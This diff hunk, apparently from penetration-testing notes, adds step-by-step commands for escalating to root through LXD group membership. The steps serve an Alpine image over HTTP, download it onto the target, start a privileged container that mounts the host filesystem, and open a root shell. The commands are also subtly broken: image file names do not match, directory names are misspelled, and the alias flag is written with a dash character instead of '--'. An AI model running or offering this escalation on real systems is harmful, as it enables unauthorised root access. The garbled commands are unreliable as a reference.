@@ -1197,5 +1197,21 @@ git clone https://github.com/saghul/lxd-alpine-builder.git
 cd lxd-alphine-bulder
 
 ./build-alphine
+   
+python3 -m http.server 8080
 ```
+On the remote machine
+```
+wget http://ip/alpine-v3.12-x86_64-20200831_0125.tar.gz
 
+//Let’s add the image to lxd using the following command
+lxc image import ./apline-v3.10-x86_64–20191008_1227.tar.gz — alias myimage
+
+//After that we can initialize the image inside a new Linux container. And then mount it the root directory.
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+
+//And then execute the /bin/sh to get root
+lxc exec ignite /bin/sh
+```
